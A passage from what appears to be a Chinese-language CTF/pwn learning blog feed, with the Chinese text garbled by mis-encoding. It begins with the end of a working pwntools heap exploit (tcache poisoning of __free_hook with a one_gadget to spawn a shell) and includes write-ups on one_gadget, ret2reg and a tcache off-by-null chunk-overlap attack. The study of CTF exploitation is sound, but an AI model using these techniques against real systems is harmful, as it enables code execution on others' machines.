        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span><span class="token comment">#tcahe é‡Œé¢012345 9</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    
    delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'dddd'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'eeee'</span><span class="token punctuation">)</span>

    
    show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    unsorted_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'unsorted_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>unsorted_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    main_arena <span class="token operator">=</span> unsorted_addr <span class="token operator">-</span> <span class="token number">0x60</span>

    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/da1sy/environment/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so'</span><span class="token punctuation">)</span>

    malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
    libc_base <span class="token operator">=</span> main_arena <span class="token operator">-</span> malloc_hook <span class="token operator">-</span> <span class="token number">0x10</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    one_gadget1 <span class="token operator">=</span> <span class="token number">0x4f29e</span>
    one_gadget2 <span class="token operator">=</span> <span class="token number">0x4f2a5</span>
    one_gadget3 <span class="token operator">=</span> <span class="token number">0x4f302</span>
    one_gadget4 <span class="token operator">=</span> <span class="token number">0x10a2fc</span>

    one_gadget1 <span class="token operator">+=</span> libc_base
    one_gadget2 <span class="token operator">+=</span> libc_base
    one_gadget3 <span class="token operator">+=</span> libc_base
    one_gadget4 <span class="token operator">+=</span> libc_base

    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">b'ffff'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

    free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'free_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'aaaaa'</span><span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget3<span class="token punctuation">)</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>   

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>tcache</tag>
        <tag>é«˜libc</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºOne_gadget</title>
    <url>/2024/04/19/%E5%85%B3%E4%BA%8Eone-gadget/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®æè¿°å­˜åœ¨ç”¨æˆ·è¾“å…¥è·å–å‡½æ•°æŒ‡é’ˆï¼Œå¹¶é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§é€šè¿‡ç”¨æˆ·è¾“å…¥æ¥è·å–å‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨å‡½æ•°çš„åšæ³•æå…¶å±é™©ã€‚"><a href="#é¢˜ç›®æè¿°å­˜åœ¨ç”¨æˆ·è¾“å…¥è·å–å‡½æ•°æŒ‡é’ˆï¼Œå¹¶é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§é€šè¿‡ç”¨æˆ·è¾“å…¥æ¥è·å–å‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨å‡½æ•°çš„åšæ³•æå…¶å±é™©ã€‚" class="headerlink" title="é¢˜ç›®æè¿°å­˜åœ¨ç”¨æˆ·è¾“å…¥è·å–å‡½æ•°æŒ‡é’ˆï¼Œå¹¶é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§é€šè¿‡ç”¨æˆ·è¾“å…¥æ¥è·å–å‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨å‡½æ•°çš„åšæ³•æå…¶å±é™©ã€‚"></a>é¢˜ç›®æè¿°å­˜åœ¨ç”¨æˆ·è¾“å…¥è·å–å‡½æ•°æŒ‡é’ˆï¼Œå¹¶é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§é€šè¿‡ç”¨æˆ·è¾“å…¥æ¥è·å–å‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨å‡½æ•°çš„åšæ³•æå…¶å±é™©ã€‚</h2><p>one_gadgetæ˜¯libcä¸­å­˜åœ¨çš„ä¸€äº›æ‰§è¡Œexecve(â€œbin&#x2F;shâ€,NULL,NULL)çš„ç‰‡æ®µï¼Œå½“å¯ä»¥æ³„éœ²libcåœ°å€ï¼Œå¹¶ä¸”å¯ä»¥çŸ¥é“libcç‰ˆæœ¬çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥å¿«é€Ÿæ§åˆ¶æŒ‡ä»¤å¯„å­˜å™¨å¼€å§‹shellã€‚ç›¸å½“äºsystem(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œè¿™ç§æ–¹å¼æ›´æ–¹ä¾¿ï¼Œä¸ç”¨æ§åˆ¶RDIï¼ŒRSIï¼ŒRDXç­‰å¯„å­˜å™¨ã€‚</p>
<p>å®‰è£…æ–¹å¼</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">-y</span> <span class="token function">install</span> ruby
<span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä½¿ç”¨æ–¹æ³•</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">one_gadget libc.so.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>one_gadgetå¹¶ä¸æ€»æ˜¯å¯ä»¥è·å–shellï¼Œå®ƒé¦–å…ˆè¦æ»¡è¶³ä¸€äº›æ¡ä»¶æ‰èƒ½æ‰§è¡ŒæˆåŠŸã€‚</p>
]]></content>
      <categories>
        <category>æ€è€ƒ</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>Binary</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºPython3å¦‚ä½•å®ç°base64ç¼–ç è§£ç </title>
    <url>/2024/04/19/%E5%85%B3%E4%BA%8Epython3%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0base64%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/</url>
    <content><![CDATA[<p><img src="https://s2.loli.net/2024/04/19/B2j1kgEqVI8FYbu.png" alt="image-20240419114231543.png"></p>
<p>AttributeError: â€˜bytesâ€™ object has no attribute â€˜encodeâ€™æ˜¯ï¼šâ€œå­—èŠ‚â€å¯¹è±¡æ²¡æœ‰å±æ€§çš„ç¼–ç çš„æ„æ€ã€‚</p>
<p>å¾ˆæ˜æ˜¾ï¼Œæ˜¯ç¼–ç æ ¼å¼çš„é—®é¢˜ã€‚</p>
<p>ä½¿ç”¨.encode(â€œbase64â€)åœ¨python3ä¸­ä¼šæŠ¥é”™ã€‚b64encodeå‡½æ•°çš„å‚æ•°ä¸ºbyteç±»å‹ï¼Œè€Œpython3ä¸­å­—ç¬¦éƒ½æ˜¯unicodeç¼–ç ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œbase64ç¼–ç ä¹‹å‰å¿…é¡»å…ˆè½¬ç ã€‚base64ç”Ÿæˆçš„ç¼–ç éƒ½æ˜¯asciiå­—ç¬¦ã€‚</p>
<p>è§£ä¸€èˆ¬çš„pwné¢˜ç›®çš„æ–¹å¼ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload_ <span class="token operator">=</span> <span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æºç </p>
<p><img src="https://s2.loli.net/2024/04/19/SPQ7A8uUGEICTZe.png" alt="image-20240419120225364.png"></p>
<p>æ‰§è¡Œç»“æœ</p>
<p><img src="https://s2.loli.net/2024/04/19/pUEQFSbCgWKDiLo.png" alt="image-20240419120244744.png"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Binary</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>å®éªŒå®¤çœ‹åˆ°çš„ä¸€ä¸ªé—®é¢˜</title>
    <url>/2024/04/21/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%9C%8B%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p><img src="https://s2.loli.net/2024/04/21/wLnhEU6yuDTf3le.png" alt="1.PNG"><br>å¯ä»¥å…ˆæ€è€ƒæ€è€ƒä¸ºå•¥ï¼Ÿå­¦å¼Ÿé—®çš„é—®é¢˜ï¼Œæ˜æ˜¾å°±æ˜¯æ²¡æœ‰åšå¥½äº¤äº’ï¼Œä½†ä¸ºå•¥ä¼šä¸€èµ·å‘é€å‘¢ï¼Ÿ</p>
<p>æˆ‘å»ç½‘ä¸Šæ‰¾äº†æ‰¾ç›¸å…³çŸ¥è¯†ï¼Œ<br><img src="https://s2.loli.net/2024/04/21/MFfi7To1BIbtOVg.png" alt="B12262FE6DF289C7494B2771A7C12E24.png"></p>
<p>çªç„¶æ¥äº†ç‚¹æ€è·¯ï¼Œä½†è¿˜æ˜¯ä¸ç¡®å®šï¼Œä¸å¦‚è‡ªå·±å»å†™è¿‡cç¨‹åºè¯•è¯•å‘—ã€‚<br><img src="https://s2.loli.net/2024/04/21/QPwT1Lpy5mMtZSx.png" alt="2.PNG"></p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> nbytes<span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]Please inputs the length of your name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]What's u name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç»“åˆscanfé‡åˆ°ç©ºæ ¼ç¬¦ä¼šåœä¸‹ï¼Œæˆ‘æ„é€ payload</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'-1'</span> <span class="token operator">+</span> <span class="token string">b'\x0a'</span> <span class="token operator">+</span> <span class="token string">b'aaaaaaaaaaaaaaaaaaaa'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<p><img src="https://s2.loli.net/2024/04/21/wPSvWbhEo23Nrkd.png" alt="3.PNG"></p>
<p>å¯ä»¥çœ‹åˆ°æ¢è¡Œç¬¦åé¢çš„å†…å®¹ä¹Ÿè¯»å…¥è¿›å»äº†ã€‚</p>
<p>ç°åœ¨å›æ¥çœ‹çœ‹é—®é¢˜ã€‚çŒœæµ‹ä¼šä¸ä¼šæ˜¯scanfå’Œreadçš„ç¼“å†²åŒºä¸ä¸€æ ·å‘¢ï¼Ÿ<br><img src="https://s2.loli.net/2024/04/21/ECs57NwIuekXQ2D.png" alt="4.PNG"></p>
<p>é—®äº†é—®chatgptï¼Œå¾—åˆ°äº†å‡†ç¡®çš„ç­”æ¡ˆã€‚æˆ‘ä¹Ÿå­¦ä¹ åˆ°äº†ï¼Œioæµå’Œæ ‡å‡†è¾“å…¥æµçš„ç¼“å†²åŒºä¸ä¸€æ ·ã€‚</p>
<p>ä¸‹æ¬¡è¿˜æ˜¯è¦åšå¥½äº¤äº’å§ï¼</p>
]]></content>
      <categories>
        <category>æ€è€ƒ</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>Binary</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…è°ˆRet2regçš„ç†è§£</title>
    <url>/2024/04/20/%E6%B5%85%E8%B0%88Ret2reg%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>1ï¼ŒæŸ¥çœ‹æ ˆæº¢å‡ºè¿”å›æ—¶å“ªä¸ªå¯„å­˜å™¨æŒ‡å‘ç¼“å†²åŒºç©ºé—´ã€‚</p>
<p>2ï¼ŒæŸ¥çœ‹å¯¹åº”çš„callå¯„å­˜å™¨æˆ–jmpå¯„å­˜å™¨æŒ‡ä»¤ï¼Œå°†IPè®¾ç½®ä¸ºè¯¥æŒ‡ä»¤åœ°å€ã€‚</p>
<p>3ï¼Œå°†å¯„å­˜å™¨æ‰€æŒ‡å‘çš„ç©ºé—´ä¸Šæ³¨å…¥shellcodeï¼ˆè¯¥ç©ºé—´æ˜¯å¯æ‰§è¡Œçš„ï¼Œé€šå¸¸æ˜¯æ ˆä¸Šï¼‰</p>
<p>4ï¼Œä¸€èˆ¬è§£é¢˜è¯¥æ¼æ´çš„ç‰¹ç‚¹æ˜¯å­˜åœ¨å±é™©å‡½æ•°strcpyçš„å­—ç¬¦ä¸²æ‹·è´å‡½æ•°</p>
<h2 id="è§£é¢˜ä¸€èˆ¬æ­¥éª¤"><a href="#è§£é¢˜ä¸€èˆ¬æ­¥éª¤" class="headerlink" title="è§£é¢˜ä¸€èˆ¬æ­¥éª¤"></a>è§£é¢˜ä¸€èˆ¬æ­¥éª¤</h2><p>1ï¼Œæ£€æŸ¥ä¿æŠ¤å­˜åœ¨RWX segments</p>
<p>2ï¼Œä½¿ç”¨gdbè°ƒè¯•ç¨‹åºï¼Œçœ‹çœ‹é‚£äº›å¯„å­˜å™¨æ˜¯æŒ‡å‘ç¼“å†²åŒºçš„</p>
<p>3ï¼Œåœ¨åˆ©ç”¨</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> vuln <span class="token parameter variable">--only</span> <span class="token string">"call"</span>
ROPgadget <span class="token parameter variable">--binary</span> vuln <span class="token parameter variable">--only</span> <span class="token string">"jmp"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>4,æ ˆå¸ƒå±€</p>
<p><img src="https://s2.loli.net/2024/04/20/JhgWtfbFX9EemaO.png" alt=".PNG"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>Binary</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>é«˜ç‰ˆæœ¬Tcache+off-by-One</title>
    <url>/2024/07/24/%E9%AB%98%E7%89%88%E6%9C%ACtcache-off-by-one/</url>
    <content><![CDATA[<h5 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h5><p>åˆ©ç”¨off-by-oneå®ç°å †å‘å‰é‡å ï¼Œåœ¨é€šè¿‡ä¸æ–­å‰²æ‰unsortbinsé‡Œé¢çš„chunkå—è¾¾åˆ°æ³„éœ²libcåŸºåœ°å€ï¼Œåé¢æ¥åˆ©ç”¨å‰é¢çš„å †é‡å æ¥å®ç°doule freeå°†chunkç”³è¯·åˆ°__free_hookä¸Šé¢å°†å…¶ä¿®æ”¹ä¸ºsystemï¼Œæœ€ågetshellã€‚</p>
<h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>ä¿æŠ¤å…¨å¼€</p>
<p>mainå‡½æ•°ï¼Œç»å…¸èœå•é¢˜,æ²¡æœ‰editå‡½æ•°ã€‚æ„Ÿè§‰åŸºæœ¬ä¸Šæ¼æ´ç‚¹è‚¯å®šåœ¨addï¼ˆï¼‰å‡½æ•°é‡Œé¢</p>
<p><img src="https://s2.loli.net/2024/08/19/Z9FxX1U3Iwm7EiJ.png" alt="7eb2d33ff08e47bf8090ba7306a18ffc.png"></p>
<p>deleteå‡½æ•°ï¼ŒæŒ‡é’ˆç½®0äº†æ²¡æœ‰uaf</p>
<p><img src="https://s2.loli.net/2024/08/19/fxum4vkcXia1KjS.png" alt="73b33edf07a943cfb65133ae007e4828.png"></p>
<p>addå‡½æ•°ï¼Œå­˜åœ¨off-by-nullï¼Œè€Œä¸”åªç»™ç”³è¯·15ä¸ªchunk</p>
<p><img src="https://s2.loli.net/2024/08/19/Wma5IAe2StEnN3x.png" alt="a6fcc88eaf094ec58b2d4cdb78ced075.png"></p>
<h5 id="ç»“åˆexpåˆ†æ"><a href="#ç»“åˆexpåˆ†æ" class="headerlink" title="ç»“åˆexpåˆ†æ"></a>ç»“åˆexpåˆ†æ</h5><p>å…ˆæŠŠtcacheå¡«æ»¡ï¼Œç”³è¯·çš„å¤§å°å¿…é¡»å¤§äº0xf0ï¼Œå› ä¸ºoff-by-nullä¼šå°†ä½ä½ä¿®æ”¹ä¸º0ï¼Œå¦‚æœä½ æ˜¯0x90å°±ä¼šå˜æˆ0x00</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æŠŠåºå·ä¸º8çš„chunkçš„pre_sizeä½ä¿®æ”¹ä¸º0x100ï¼ŒåŒæ—¶åºå·ä¸º7çš„chunkè¿›å…¥åˆ°unsortbinsé‡Œé¢ï¼ˆæ­¤æ—¶éœ€è¦å°†å…¶çš„fdå’ŒbkæŒ‡é’ˆç»™åˆ°åºå·ä¸º8çš„chunkï¼‰ï¼Œåˆ¶é€ å‡chunkå¤´ï¼Œ0x120ä¸ºå‰é¢åºå·ä¸º7å’Œ8çš„chunkå¤§å°å’Œ</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#åˆ¶é€ å‡chunkå¤´ï¼Œ0x120ä¸ºå‰é¢åºå·ä¸º7å’Œ8çš„chunkå¤§å°å’Œï¼ŒæŠŠåº        </span>
å·ä¸º<span class="token number">9</span>çš„chunkçš„pre_sizeä½ä¿®æ”¹ä¸º<span class="token number">0x100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æ­¤æ—¶çš„å†…å­˜å¯¹åº”çš„chunkåºå·ä¸º8</p>
<p><img src="https://s2.loli.net/2024/08/19/qRQ4nFuVDXpAWLt.png" alt="11c270ae2b8c44b8b601cd2b3282247c.png"></p>
<p>å †é‡å ï¼Œæ­¤æ—¶åˆå¹¶åºå·ä¸º7ï¼Œ8ï¼Œ9çš„chunkè¿›å…¥åˆ°unsortbinsé‡Œé¢ï¼ˆä½†å…¶å®åºå·ä¸º8çš„chunkæ ¹æœ¬æ²¡æœ‰freeï¼Œå¯ä¾›æˆ‘ä»¬åˆ©ç”¨ï¼‰ï¼Œå¤§å°ä¸º0x220ï¼Œä¸¤æ¬¡ç”³è¯·ç‰¹æ®Šå¤§å°çš„chunkï¼Œä»unsortbinsé‡Œé¢åˆ†å‰²å‡ºæ¥chunkå…¶å¤§å°ä¸ºåºå·ä¸º7çš„chunkï¼Œè¿™æ ·å°±å¯ä»¥å°†å…¶fdå’ŒbkæŒ‡é’ˆç»™åˆ°0x55c0a9334a60å¤„ã€‚ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”³è¯·0xf0ï¼Œå› ä¸ºç›´æ¥ç”³è¯·binsä¼šå°†tcacheé‡Œé¢çš„chunkç»™ä½ ã€‚åŒ…æ‹¬ç¬¬äºŒä¸ªchunkçš„sizeä¸º0x20ï¼Œè¿™æ˜¯ä¸ºåé¢doule freeåšå‡†å¤‡ã€‚æœ¬äººä¹Ÿæ˜¯æ— æ„ä¹‹é—´åšåˆ°çš„ï¼Œå®å±è¿æ°”åŠ æˆäº†ã€‚</p>
